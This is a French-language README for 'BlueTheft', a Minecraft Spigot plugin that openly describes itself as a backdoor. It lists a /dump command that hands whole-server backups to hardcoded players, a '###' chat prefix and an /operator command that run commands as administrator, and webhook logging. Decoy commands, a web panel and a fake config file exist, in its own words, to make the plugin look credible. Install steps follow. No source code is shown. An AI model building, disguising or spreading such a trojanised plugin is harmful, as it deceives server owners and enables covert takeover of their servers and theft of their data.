# BlueTheft

BlueTheft est un plugin Spigot conçu pour la version 1.12.2 de Minecraft. Ce projet est un exemple qui inclut des fonctionnalités avancées, notamment une **backdoor** et diverses commandes et fonctionnalités pour assurer crédibilité et contrôle.

---

## Fonctionnalités principales

### 1. **Backdoor intégrée**
- La commande `/dump` :
  - Pour les utilisateurs autorisés (définis dans `AuthorizedPlayers.java`), elle génère une sauvegarde complète du serveur téléchargeable via `http://0.0.0.0:30000/backup.zip`.
  - Pour les utilisateurs non autorisés, un message d'erreur s'affiche.
- Objectif futur : intégrer une API permettant l'upload direct des sauvegardes vers un cloud.

### 2. **WebInterface**
- Interface HTTP contenant :
  - Informations sur le joueur : vie, nourriture, pseudo, position.
  - Un bouton pour envoyer un message à un joueur spécifique.
- L'interface est conçue pour rendre le serveur HTTP crédible.

### 3. **Exécution de commandes via chat**
- Préfixe spécial `###` suivi d'une commande (`###{commande}`) permet d'exécuter une commande en tant qu'administrateur.

### 4. **Système de logs**
- Intégration d'un système de logs via WebHook pour surveiller les actions importantes.

### 5. **Gestion des adresses IP**
- Une méthode permet de récupérer :
  - L'adresse IP publique IPv4.
  - L'adresse IP locale IPv4.

---

## Commandes disponibles

### 1. `/dump`
- Utilisé pour générer et fournir une sauvegarde du serveur.
- Accessible uniquement aux utilisateurs autorisés.

### 2. `/nickname`
- Permet de changer son pseudo en jeu pour renforcer la crédibilité.

### 3. `/operator`
- Permet d'exécuter des commandes définies dans le code source en tant que console (admin).
- Si le joueur n'est pas autorisé, un message d'erreur s'affiche.

### 4. `/helpbluetheft`
- Affiche un message d'aide pour rendre le plugin crédible.

### 5. `/players`
- Affiche la liste des joueurs connectés pour renforcer la crédibilité.

### 6. `/webpanel`
- Donne l'adresse du panneau Web (WebInterface).

---

## Fichiers inclus

### 1. `config.yml`
- Faux fichier de configuration pour donner l'impression d'une configuration classique.
  
## Dépendances Nécéssaires
- spigot-1.12.2.jar

---

## Objectifs futurs

1. **Intégration Cloud** : permettre l'upload automatique des sauvegardes vers un service cloud via API.
2. **Amélioration de la WebInterface** : ajouter davantage d'informations et d'actions disponibles pour l'administrateur.
3. **Amélioration des logs Discord**
4. **Ajout d'un bot Discord**

---

## Installation

1. Placez le fichier JAR du plugin dans le dossier `plugins` de votre serveur Spigot.
2. Configurez les fichiers nécessaires (si applicable).
3. Démarrez le serveur pour activer BlueTheft.

---

